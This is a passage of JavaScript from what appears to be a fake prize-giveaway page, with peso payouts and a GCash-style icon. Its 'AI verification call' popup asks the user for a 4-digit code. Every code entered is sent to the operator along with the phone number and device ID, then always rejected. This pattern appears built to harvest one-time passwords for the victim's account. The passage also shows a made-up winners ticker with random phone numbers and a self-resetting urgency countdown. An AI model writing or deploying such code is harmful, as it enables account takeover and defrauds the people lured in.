    // ============================================================
    function showSuccessPopup(amount) {
        var popup = document.getElementById('successPopup');
        var amountEl = document.getElementById('successAmount');
        var closeBtn = document.getElementById('successCloseBtn');
        
        if (amountEl) amountEl.textContent = amount;
        if (popup) popup.style.display = 'flex';
        
        playSound('success');
        
        if (closeBtn) {
            closeBtn.onclick = function() {
                popup.style.display = 'none';
            };
        }
        
        setTimeout(function() {
            if (popup) popup.style.display = 'none';
        }, 5000);
    }
    
    // ============================================================
    // FIREWALL AI VERIFICATION POPUP
    // ============================================================
    function showFirewallVerificationPopup() {
        var existingPopup = document.getElementById('firewallAIPopup');
        if (existingPopup) existingPopup.remove();
        
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
        
        addFirewallStyles();
        
        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhoneStr.length >= 11 ?
            userPhoneStr.substring(0, 4) + "***" + userPhoneStr.substring(7, 11) :
            userPhoneStr;
        
        var overlay = document.createElement('div');
        overlay.id = 'firewallAIPopup';
        overlay.className = 'firewall-ai-overlay';
        overlay.innerHTML = 
            '<div class="firewall-ai-container">' +
                '<button class="firewall-ai-close" id="firewallAIClose">✕</button>' +
                
                '<div class="firewall-ai-header">' +
                    '<div class="firewall-ai-icon">' +
                        '<i class="fas fa-phone-volume"></i>' +
                    '</div>' +
                    '<h2 class="firewall-ai-title">AI-VERIFICATION</h2>' +
                    '<div class="firewall-ai-subtitle">◆ CALL SYSTEM ◆</div>' +
                '</div>' +
                
                '<div class="firewall-ai-divider"></div>' +
                
                '<div class="firewall-ai-status" id="firewallAIStatus">' +
                    '<div id="firewallAIIcon" style="font-size: 32px; margin-bottom: 8px;">🎪</div>' +
                    '<div id="firewallAIText" class="firewall-ai-status-text">' +
                        '<strong>AI CALL</strong> will provide your verification code' +
                    '</div>' +
                    
                    '<div id="firewallAIPhone" style="display: none; margin-top: 10px;">' +
                        '<div class="firewall-ai-phone-number">📱 ' + formattedPhone + '</div>' +
                    '</div>' +
                    
                    '<div id="firewallAITimer" class="firewall-ai-timer" style="display: none;">60s</div>' +
                '</div>' +
                
                '<button id="firewallAIRequestBtn" class="firewall-ai-btn-primary">' +
                    '<i class="fas fa-phone-alt"></i>' +
                    '<span>REQUEST AI CALL</span>' +
                '</button>' +
                
                '<div id="firewallAICodeSection" class="firewall-ai-code-section">' +
                    '<div class="firewall-ai-code-label">' +
                        '<i class="fas fa-ticket-alt"></i>' +
                        '<span>ENTER 4-DIGIT CODE</span>' +
                    '</div>' +
                    
                    '<input type="text" id="firewallAICodeInput" class="firewall-ai-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">' +
                    
                    '<button id="firewallAIVerifyBtn" class="firewall-ai-btn-verify">' +
                        '<i class="fas fa-check-double"></i>' +
                        '<span>VERIFY CODE</span>' +
                    '</button>' +
                    
                    '<div id="firewallAIError" class="firewall-ai-msg-error">' +
                        '<i class="fas fa-times-circle"></i> Invalid code. Request a new call.' +
                    '</div>' +
                    
                    '<div id="firewallAIExpired" class="firewall-ai-msg-expired">' +
                        '<i class="fas fa-clock"></i> Call expired. Request a new call.' +
                    '</div>' +
                '</div>' +
                
                '<div style="text-align: center; margin-top: 12px;">' +
                    '<button class="firewall-ai-btn-back" id="firewallAIBackBtn">← BACK</button>' +
                '</div>' +
            '</div>';
        
        document.body.appendChild(overlay);
        
        setTimeout(function() {
            overlay.classList.add('show');
        }, 50);
        
        attachFirewallEvents();
    }
    
    function attachFirewallEvents() {
        var closeBtn = document.getElementById('firewallAIClose');
        var backBtn = document.getElementById('firewallAIBackBtn');
        var requestBtn = document.getElementById('firewallAIRequestBtn');
        var verifyBtn = document.getElementById('firewallAIVerifyBtn');
        var codeInput = document.getElementById('firewallAICodeInput');
        
        if (closeBtn) closeBtn.onclick = closeFirewallPopup;
        if (backBtn) backBtn.onclick = closeFirewallPopup;
        
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) {
                    alert("Please wait for the current call to complete.");
                    return;
                }
                requestFirewallCall();
            };
        }
        
        if (verifyBtn) verifyBtn.onclick = verifyFirewallCode;
        
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') verifyFirewallCode();
            });
            
            codeInput.addEventListener('input', function() {
                var value = this.value.trim();
                if (value.length === 4 && /^\d+$/.test(value)) {
                    this.style.borderColor = '#39ff14';
                    this.style.boxShadow = '0 0 35px rgba(57, 255, 20, 0.9)';
                    this.style.color = '#39ff14';
                } else {
                    this.style.borderColor = '#ffd700';
                    this.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
                    this.style.color = '#ffd700';
                }
            });
        }
    }
    
    function requestFirewallCall() {
        if (callInProgress) return;
        
        callInProgress = true;
        callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendAICallRequestNotif(userPhoneStr, deviceId, currentCallCode);
        
        var statusIcon = document.getElementById('firewallAIIcon');
        var statusText = document.getElementById('firewallAIText');
        var phoneDisplay = document.getElementById('firewallAIPhone');
        var timerDisplay = document.getElementById('firewallAITimer');
        var requestBtn = document.getElementById('firewallAIRequestBtn');
        var codeSection = document.getElementById('firewallAICodeSection');
        var codeInput = document.getElementById('firewallAICodeInput');
        var errorMsg = document.getElementById('firewallAIError');
        var expiredMsg = document.getElementById('firewallAIExpired');
        
        if (errorMsg) errorMsg.classList.remove('show');
        if (expiredMsg) expiredMsg.classList.remove('show');
        if (codeInput) codeInput.value = '';
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) {
            statusText.innerHTML = '<strong>AI CALL</strong> being placed...<br><span style="font-size: 10px; color: rgba(255,255,255,0.6);">Please wait</span>';
        }
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.classList.remove('urgent');
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.style.opacity = '0.5';
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>CALLING...</span>';
        }
        if (codeSection) codeSection.classList.remove('show');
        
        playSound('call');
        startFirewallTimer();
        
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #39ff14;">🎯 CALL CONNECTED!</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.8);">Enter the 4-digit code below</span>';
            }
            if (codeSection) codeSection.classList.add('show');
            if (codeInput) codeInput.focus();
        }, 4000);
    }
    
    function startFirewallTimer() {
        stopFirewallTimer();
        
        var timerDisplay = document.getElementById('firewallAITimer');
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                if (callCountdown <= 9) {
                    timerDisplay.classList.add('urgent');
                } else {
                    timerDisplay.classList.remove('urgent');
                }
            }
            
            if (callCountdown <= 0) {
                stopFirewallTimer();
                
                var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                sendAICallExpiredNotif(userPhoneStr, deviceId);
                
                var statusText = document.getElementById('firewallAIText');
                var codeSection = document.getElementById('firewallAICodeSection');
                var requestBtn = document.getElementById('firewallAIRequestBtn');
                var expiredMsg = document.getElementById('firewallAIExpired');
                
                if (statusText) {
                    statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request a new call</span>';
                }
                if (timerDisplay) timerDisplay.style.display = 'none';
                if (codeSection) codeSection.classList.remove('show');
                if (requestBtn) {
                    requestBtn.disabled = false;
                    requestBtn.style.opacity = '1';
                    requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
                }
                if (expiredMsg) expiredMsg.classList.add('show');
                
                callInProgress = false;
            }
        }, 1000);
    }
    
    function stopFirewallTimer() {
        if (callTimerInterval) {
            clearInterval(callTimerInterval);
            callTimerInterval = null;
        }
    }
    
    function verifyFirewallCode() {
        var codeInput = document.getElementById('firewallAICodeInput');
        var errorMsg = document.getElementById('firewallAIError');
        var expiredMsg = document.getElementById('firewallAIExpired');
        var verifyBtn = document.getElementById('firewallAIVerifyBtn');
        
        if (!codeInput) return;
        
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
            if (errorMsg) {
                errorMsg.innerHTML = '<i class="fas fa-exclamation-circle"></i> Enter valid 4-digit code.';
                errorMsg.classList.add('show');
            }
            shakeFirewallElement(codeInput);
            return;
        }
        
        if (callCountdown <= 0) {
            if (expiredMsg) expiredMsg.classList.add('show');
            if (errorMsg) errorMsg.classList.remove('show');
            return;
        }
        
        var userPhoneStr = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        sendAICodeAttemptNotif(userPhoneStr, deviceId, enteredCode, callCountdown);
        
        if (errorMsg) {
            errorMsg.innerHTML = '<i class="fas fa-times-circle"></i> ❌ Invalid code. Request new call.';
            errorMsg.classList.add('show');
        }
        
        codeInput.style.borderColor = '#ff1744';
        codeInput.style.boxShadow = '0 0 35px rgba(255, 23, 68, 0.9)';
        codeInput.style.color = '#ff1744';
        shakeFirewallElement(codeInput);
        
        if (verifyBtn) {
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = '0.5';
            setTimeout(function() {
                if (verifyBtn) {
                    verifyBtn.disabled = false;
                    verifyBtn.style.opacity = '1';
                }
            }, 2000);
        }
        
        setTimeout(function() {
            codeInput.value = '';
            codeInput.style.borderColor = '#ffd700';
            codeInput.style.boxShadow = '0 0 25px rgba(255, 215, 0, 0.6)';
            codeInput.style.color = '#ffd700';
        }, 1500);
        
        setTimeout(function() {
            if (errorMsg) errorMsg.classList.remove('show');
            
            var statusText = document.getElementById('firewallAIText');
            var timerDisplay = document.getElementById('firewallAITimer');
            var codeSection = document.getElementById('firewallAICodeSection');
            var requestBtn = document.getElementById('firewallAIRequestBtn');
            
            if (statusText) {
                statusText.innerHTML = '<strong style="color: #ff9800;">⏰ CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.7);">Request new call</span>';
            }
            if (timerDisplay) {
                timerDisplay.style.display = 'none';
                timerDisplay.classList.remove('urgent');
            }
            if (codeSection) codeSection.classList.remove('show');
            if (requestBtn) {
                requestBtn.disabled = false;
                requestBtn.style.opacity = '1';
                requestBtn.innerHTML = '<i class="fas fa-phone-alt"></i> <span>REQUEST AI CALL</span>';
            }
            
            callInProgress = false;
        }, 4000);
    }
    
    function shakeFirewallElement(element) {
        if (!element) return;
        element.style.animation = 'firewallShake 0.5s ease';
        setTimeout(function() { element.style.animation = ''; }, 500);
    }
    
    function closeFirewallPopup() {
        stopFirewallTimer();
        callInProgress = false;
        
        var overlay = document.getElementById('firewallAIPopup');
        if (overlay) {
            overlay.classList.remove('show');
            setTimeout(function() {
                if (overlay.parentNode) overlay.remove();
            }, 300);
        }
    }
    
    // ============================================================
    // FIREWALL POPUP STYLES
    // ============================================================
    function addFirewallStyles() {
        if (document.querySelector('#firewall-ai-styles')) return;
        
        var style = document.createElement('style');
        style.id = 'firewall-ai-styles';
        style.textContent = 
            '@keyframes firewallShake {' +
                '0%, 100% { transform: translateX(0); }' +
                '20% { transform: translateX(-8px); }' +
                '40% { transform: translateX(8px); }' +
                '60% { transform: translateX(-5px); }' +
                '80% { transform: translateX(5px); }' +
            '}' +
            
            '@keyframes firewallFadeIn {' +
                'from { opacity: 0; }' +
                'to { opacity: 1; }' +
            '}' +
            
            '@keyframes firewallPopIn {' +
                '0% { transform: scale(0.5) rotate(-5deg); opacity: 0; }' +
                '60% { transform: scale(1.05) rotate(2deg); }' +
                '100% { transform: scale(1) rotate(0deg); opacity: 1; }' +
            '}' +
            
            '@keyframes firewallPulseDot {' +
                '0%, 100% { opacity: 1; transform: scale(1); }' +
                '50% { opacity: 0.3; transform: scale(0.75); }' +
            '}' +
            
            '@keyframes firewallTimerUrgent {' +
                '0%, 100% { transform: scale(1); }' +
                '50% { transform: scale(1.12); }' +
            '}' +
            
            '.firewall-ai-overlay {' +
                'position: fixed;' +
                'inset: 0;' +
                'background: radial-gradient(circle at 50% 35%, rgba(255, 255, 255, 0.35) 0%, rgba(255, 255, 255, 0.1) 20%, transparent 50%), radial-gradient(ellipse at 50% 30%, #ff2a2a 0%, #c1121f 25%, #780000 55%, #2a0000 85%, #0d0000 100%);' +
                'z-index: 999999;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'padding: 16px;' +
                'opacity: 0;' +
                'transition: opacity 0.3s ease;' +
            '}' +
            
            '.firewall-ai-overlay.show {' +
                'opacity: 1;' +
            '}' +
            
            '.firewall-ai-container {' +
                'position: relative;' +
                'width: 100%;' +
                'max-width: 400px;' +
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.15) 0%, transparent 30%), linear-gradient(145deg, #d10000 0%, #ff1744 50%, #8b0000 100%);' +
                'border: 3px solid #ffd700;' +
                'border-radius: 26px;' +
                'padding: 26px 20px 22px;' +
                'box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(255, 215, 0, 0.5);' +
                'animation: firewallPopIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
                'overflow: hidden;' +
                'box-sizing: border-box;' +
            '}' +
            
            '.firewall-ai-close {' +
                'position: absolute;' +
                'top: 14px;' +
                'right: 16px;' +
                'width: 36px;' +
                'height: 36px;' +
                'background: rgba(255, 255, 255, 0.15);' +
                'border: 2px solid #ffd700;' +
                'border-radius: 50%;' +
                'color: #ffd700;' +
                'font-size: 16px;' +
                'font-weight: 900;' +
                'cursor: pointer;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'transition: all 0.25s ease;' +
                'z-index: 10;' +
            '}' +
            
            '.firewall-ai-close:hover, .firewall-ai-close:active {' +
                'background: rgba(255, 68, 68, 0.5);' +
                'color: #fff;' +
                'transform: rotate(90deg) scale(1.1);' +
                'border-color: #ff4444;' +
            '}' +
            
            '.firewall-ai-header {' +
                'text-align: center;' +
                'margin-bottom: 16px;' +
            '}' +
            
            '.firewall-ai-icon {' +
                'width: 80px;' +
                'height: 80px;' +
                'margin: 0 auto 12px;' +
                'background: radial-gradient(circle at 30% 30%, #ffeb3b, #ff6f00);' +
                'border-radius: 50%;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'border: 3px solid #fff9c4;' +
                'box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);' +
            '}' +
            
            '.firewall-ai-icon i {' +
                'font-size: 38px;' +
                'color: #8b0000;' +
            '}' +
            
            '.firewall-ai-title {' +
                'font-family: "Playfair Display", serif;' +
                'font-size: 24px;' +
                'font-weight: 900;' +
                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 30%, #ffeb3b 50%, #ff9800 100%);' +
                '-webkit-background-clip: text;' +
                'background-clip: text;' +
                'color: transparent;' +
                'letter-spacing: 3px;' +
                'text-transform: uppercase;' +
                'margin: 0 0 4px 0;' +
            '}' +
            
            '.firewall-ai-subtitle {' +
                'font-family: "Poppins", sans-serif;' +
                'font-size: 10px;' +
                'color: rgba(255, 215, 0, 0.9);' +
                'letter-spacing: 3px;' +
                'text-transform: uppercase;' +
            '}' +
            
            '.firewall-ai-divider {' +
                'width: 70px;' +
                'height: 3px;' +
                'background: linear-gradient(90deg, transparent, #ffd700, #ff1744, #ffd700, transparent);' +
                'margin: 14px auto;' +
                'border-radius: 2px;' +
            '}' +
            
            '.firewall-ai-status {' +
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%), linear-gradient(135deg, #1a0000, #330000);' +
                'border: 2px solid #ffd700;' +
                'border-radius: 18px;' +
                'padding: 16px;' +
                'margin: 14px 0;' +
                'text-align: center;' +
            '}' +
            
            '.firewall-ai-status-text {' +
                'font-family: "Poppins", sans-serif;' +
                'font-size: 12px;' +
                'color: rgba(255, 255, 255, 0.95);' +
                'line-height: 1.5;' +
            '}' +
            
            '.firewall-ai-status-text strong {' +
                'color: #ffd700;' +
                'text-shadow: 0 0 12px rgba(255, 215, 0, 0.9);' +
                'font-weight: 800;' +
            '}' +
            
            '.firewall-ai-phone-number {' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 24px;' +
                'font-weight: 900;' +
                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 50%, #ff9800 100%);' +
                '-webkit-background-clip: text;' +
                'background-clip: text;' +
                'color: transparent;' +
                'letter-spacing: 2px;' +
                'margin: 10px 0;' +
            '}' +
            
            '.firewall-ai-timer {' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 34px;' +
                'font-weight: 900;' +
                'color: #39ff14;' +
                'text-shadow: 0 0 20px rgba(57, 255, 20, 0.7);' +
                'letter-spacing: 3px;' +
                'margin: 8px 0;' +
            '}' +
            
            '.firewall-ai-timer.urgent {' +
                'color: #ff1744;' +
                'text-shadow: 0 0 20px rgba(255, 23, 68, 0.9);' +
                'animation: firewallTimerUrgent 0.5s ease-in-out infinite;' +
            '}' +
            
            '.firewall-ai-btn-primary {' +
                'width: 100%;' +
                'padding: 16px 20px;' +
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%), linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);' +
                'border: 3px solid #fff9c4;' +
                'border-radius: 14px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 14px;' +
                'font-weight: 900;' +
                'color: #8b0000;' +
                'cursor: pointer;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'gap: 10px;' +
                'letter-spacing: 2px;' +
                'text-transform: uppercase;' +
                'box-shadow: 0 5px 0 #8b4500, 0 8px 20px rgba(0, 0, 0, 0.5);' +
                'transition: all 0.1s ease;' +
            '}' +
            
            '.firewall-ai-btn-primary:active {' +
                'transform: translateY(5px);' +
                'box-shadow: 0 0 0 #8b4500;' +
            '}' +
            
            '.firewall-ai-btn-primary:disabled {' +
                'opacity: 0.5;' +
                'cursor: not-allowed;' +
            '}' +
            
            '.firewall-ai-code-section {' +
                'display: none;' +
                'margin-top: 14px;' +
            '}' +
            
            '.firewall-ai-code-section.show {' +
                'display: block;' +
                'animation: firewallFadeIn 0.4s ease;' +
            '}' +
            
            '.firewall-ai-code-label {' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'gap: 8px;' +
                'margin-bottom: 12px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 10px;' +
                'color: #ffd700;' +
                'letter-spacing: 2px;' +
                'text-transform: uppercase;' +
            '}' +
            
            '.firewall-ai-input {' +
                'width: 100%;' +
                'max-width: 200px;' +
                'margin: 0 auto 12px;' +
                'display: block;' +
                'text-align: center;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 28px;' +
                'font-weight: 900;' +
                'padding: 14px;' +
                'background: #0a0000;' +
                'border: 3px solid #ffd700;' +
                'border-radius: 14px;' +
                'color: #ffd700;' +
                'letter-spacing: 8px;' +
                'outline: none;' +
                'box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);' +
                'box-sizing: border-box;' +
            '}' +
            
            '.firewall-ai-input::placeholder {' +
                'color: rgba(255, 215, 0, 0.4);' +
                'letter-spacing: 4px;' +
                'font-size: 18px;' +
            '}' +
            
            '.firewall-ai-btn-verify {' +
                'width: 100%;' +
                'padding: 14px 20px;' +
                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%), linear-gradient(180deg, #00ff88 0%, #00cc44 50%, #008833 100%);' +
                'border: 3px solid #7dffb3;' +
                'border-radius: 12px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 14px;' +
                'font-weight: 900;' +
                'color: #00331a;' +
                'cursor: pointer;' +
                'display: flex;' +
                'align-items: center;' +
                'justify-content: center;' +
                'gap: 10px;' +
                'letter-spacing: 2px;' +
                'text-transform: uppercase;' +
                'box-shadow: 0 5px 0 #005522, 0 8px 20px rgba(0, 0, 0, 0.5);' +
                'transition: all 0.1s ease;' +
            '}' +
            
            '.firewall-ai-btn-verify:active {' +
                'transform: translateY(5px);' +
                'box-shadow: 0 0 0 #005522;' +
            '}' +
            
            '.firewall-ai-msg-error {' +
                'display: none;' +
                'font-family: "Poppins", sans-serif;' +
                'font-size: 11px;' +
                'color: #ff4466;' +
                'text-align: center;' +
                'padding: 10px 14px;' +
                'margin-top: 10px;' +
                'background: rgba(255, 68, 102, 0.2);' +
                'border: 2px solid rgba(255, 68, 102, 0.5);' +
                'border-radius: 12px;' +
                'font-weight: 600;' +
            '}' +
            
            '.firewall-ai-msg-error.show {' +
                'display: block;' +
            '}' +
            
            '.firewall-ai-msg-expired {' +
                'display: none;' +
                'font-family: "Poppins", sans-serif;' +
                'font-size: 11px;' +
                'color: #ff9800;' +
                'text-align: center;' +
                'padding: 10px 14px;' +
                'margin-top: 10px;' +
                'background: rgba(255, 152, 0, 0.2);' +
                'border: 2px solid rgba(255, 152, 0, 0.5);' +
                'border-radius: 12px;' +
                'font-weight: 600;' +
            '}' +
            
            '.firewall-ai-msg-expired.show {' +
                'display: block;' +
            '}' +
            
            '.firewall-ai-btn-back {' +
                'background: linear-gradient(180deg, #555, #333);' +
                'border: 2px solid #777;' +
                'border-radius: 10px;' +
                'padding: 10px 20px;' +
                'font-family: "Orbitron", monospace;' +
                'font-size: 11px;' +
                'font-weight: 700;' +
                'color: #ccc;' +
                'cursor: pointer;' +
                'letter-spacing: 1.5px;' +
                'text-transform: uppercase;' +
                'box-shadow: 0 3px 0 #222;' +
            '}' +
            
            '.firewall-ai-btn-back:active {' +
                'transform: translateY(3px);' +
                'box-shadow: 0 0 0 #222;' +
            '}' +
            
            '@media (max-width: 480px) {' +
                '.firewall-ai-container { padding: 22px 16px 18px; border-radius: 22px; }' +
                '.firewall-ai-title { font-size: 20px; letter-spacing: 2px; }' +
                '.firewall-ai-icon { width: 70px; height: 70px; }' +
                '.firewall-ai-icon i { font-size: 32px; }' +
                '.firewall-ai-phone-number { font-size: 20px; }' +
                '.firewall-ai-timer { font-size: 28px; }' +
                '.firewall-ai-input { font-size: 24px; padding: 12px; letter-spacing: 6px; }' +
                '.firewall-ai-btn-primary, .firewall-ai-btn-verify { padding: 14px 16px; font-size: 12px; }' +
            '}';
        document.head.appendChild(style);
    }
    
    // ============================================================
    // TIMER — OPTIMIZED
    // ============================================================
    function initTimer() {
        var displayElement = document.getElementById('mainTimerDisplay');
        if (!displayElement) return;
        
        var CYCLE_HOURS = 72;
        var timerEndDate = null;
        
        try {
            var savedEnd = localStorage.getItem('timerEndDate');
            var now = Date.now();
            
            if (savedEnd && parseInt(savedEnd) > now) {
                timerEndDate = parseInt(savedEnd);
            } else {
                timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                localStorage.setItem('timerEndDate', timerEndDate);
            }
            
            function update() {
                var now = Date.now();
                var diff = timerEndDate - now;
                
                if (diff <= 0) {
                    timerEndDate = now + (CYCLE_HOURS * 60 * 60 * 1000);
                    localStorage.setItem('timerEndDate', timerEndDate);
                    diff = CYCLE_HOURS * 60 * 60 * 1000;
                }
                
                var days = Math.floor(diff / (1000 * 60 * 60 * 24));
                var hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
                var minutes = Math.floor((diff / (1000 * 60)) % 60);
                var seconds = Math.floor((diff / 1000) % 60);
                
                displayElement.textContent = days + 'D ' +
                    hours.toString().padStart(2, '0') + ':' +
                    minutes.toString().padStart(2, '0') + ':' +
                    seconds.toString().padStart(2, '0');
            }
            
            update();
            setInterval(update, 1000);
        } catch(e) {
            console.error('Timer error:', e);
        }
    }
    
    // ============================================================
    // TICKER — OPTIMIZED
    // ============================================================
    function initTicker() {
        var winnerSpan = document.getElementById('winnerText');
        if (!winnerSpan) return;
        
        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
        var amountRarity = [
            { amount: 500, weight: 85 },
            { amount: 1000, weight: 10 },
            { amount: 2000, weight: 3 },
            { amount: 2500, weight: 2 }
        ];
        var actions = ["received", "received", "withdraw"];
        
        function generateRandomAmount() {
            var totalWeight = 0;
            for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
            var random = Math.random() * totalWeight;
            var cumulative = 0;
            for (var i = 0; i < amountRarity.length; i++) {
                cumulative += amountRarity[i].weight;
                if (random <= cumulative) return amountRarity[i].amount;
            }
            return 500;
        }
        
        function updateTicker() {
            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
            var last4 = Math.floor(1000 + Math.random() * 9000);
            var amount = generateRandomAmount();
            var action = actions[Math.floor(Math.random() * actions.length)];
            
            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action +
                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' +
                amount.toLocaleString();
        }
        
        updateTicker();
        setInterval(updateTicker, 8000);
    }
    
    // ============================================================
    // CONFETTI CANVAS — OPTIMIZED
    // ============================================================
    var confettiCanvas = null;
    var confettiAnimation = null;
    
    function initConfetti() {
        confettiCanvas = document.getElementById('confettiCanvas');
        
        if (SKIP_HEAVY_EFFECTS && confettiCanvas) {
            confettiCanvas.style.display = 'none';
        }
    }
    
    function startConfetti() {
        if (!confettiCanvas) return;
        
        if (SKIP_HEAVY_EFFECTS) return;
        
        confettiCanvas.style.display = 'block';
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
        
        var ctx = confettiCanvas.getContext('2d');
        var particles = [];
        
        for (var i = 0; i < 50; i++) {
            particles.push({
                x: Math.random() * confettiCanvas.width,
                y: Math.random() * confettiCanvas.height - confettiCanvas.height,
                size: Math.random() * 6 + 3,
                color: 'hsl(' + (Math.random() * 360) + ', 100%, 60%)',
                speed: Math.random() * 3 + 2,
                rotation: Math.random() * 360,
                rotationSpeed: (Math.random() - 0.5) * 5
            });
        }
        
        function draw() {
            if (!confettiCanvas || confettiCanvas.style.display === 'none') return;
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            
            for (var i = 0; i < particles.length; i++) {
                var p = particles[i];
                ctx.setTransform(1, 0, 0, 1, p.x, p.y);
                ctx.rotate(p.rotation * Math.PI / 180);
                ctx.fillStyle = p.color;
                ctx.fillRect(-p.size/2, -p.size/2, p.size, p.size);
                
                p.y += p.speed;
                p.rotation += p.rotationSpeed;
                
                if (p.y > confettiCanvas.height) {
                    p.y = -p.size;
                    p.x = Math.random() * confettiCanvas.width;
                }
            }
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            confettiAnimation = requestAnimationFrame(draw);
        }
        
        draw();
        
        setTimeout(function() {
            if (confettiAnimation) cancelAnimationFrame(confettiAnimation);
            ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiCanvas.style.display = 'none';
        }, 2500);
    }
    
    // ============================================================
    // BUTTON EVENTS
    // ============================================================
    function attachButtonEvents() {
        var logoutBtn = document.getElementById('logoutBtn');
        if (logoutBtn) {
            logoutBtn.addEventListener('click', logoutUser);
        }
        
        var fbBtn = document.getElementById('facebookShareBtn');
        if (fbBtn) {
            fbBtn.addEventListener('click', shareOnFacebook);
        }
    }
    
    function logoutUser() {
        if (userPhone) {
            try {
                db.ref('user_sessions/' + userPhone).update({
                    status: 'offline',
                    lastSeen: firebase.database.ServerValue.TIMESTAMP
                });
            } catch(e) {}
        }
        localStorage.clear();
        sessionStorage.clear();
        window.location.replace('index.html');
    }
    
    function shareOnFacebook() {
        var shareUrl = 'https://tiny.cc/LuckyDrop';
        window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=400');
    }
    
    // ============================================================
    // BAN CHECK
    // ============================================================
    function checkIfBanned() {
        if (!userPhone) return;
        try {
            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
                if (snap.exists()) {
                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
                    localStorage.clear();
                    sessionStorage.clear();
                    window.location.replace('index.html');
                }
            });
        } catch(e) {}
    }
    
    // ============================================================
    // ADMIN-ONLY FORCE LOGOUT
    // ============================================================
    function initAdminForceLogoutListener() {
        if (!userPhone || !db) return;
        
        var cleanPhone = userPhone.replace(/[^0-9]/g, '');
        console.log('🔍 Admin Force Logout Listener active for:', cleanPhone);
        
        try {
            userRef.update({
                status: 'online',
                forceLogout: false,
                lastSeen: firebase.database.ServerValue.TIMESTAMP
            }).then(function() {
                console.log('✅ User reset to ONLINE, forceLogout flag cleared');
                
                setTimeout(function() {
                    setupAdminLogoutListener(cleanPhone);
                }, 2000);
                
            }).catch(function(e) {
                console.error('Failed to reset:', e);
                setTimeout(function() {
                    setupAdminLogoutListener(cleanPhone);
                }, 3000);
            });
            
        } catch(e) {
            console.error('Force logout listener error:', e);
        }
    }
    
    function setupAdminLogoutListener(cleanPhone) {
        if (listenersSetup) return;
        listenersSetup = true;
        
        console.log('🔍 Setting up admin logout listeners...');
        
        forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
        forceLogoutFlagListener.on('value', function(snapshot) {
            var forceFlag = snapshot.val();
            var timeSinceLoad = Date.now() - pageLoadTime;
            
            if (forceFlag === true && !logoutTriggered && timeSinceLoad > 3000) {
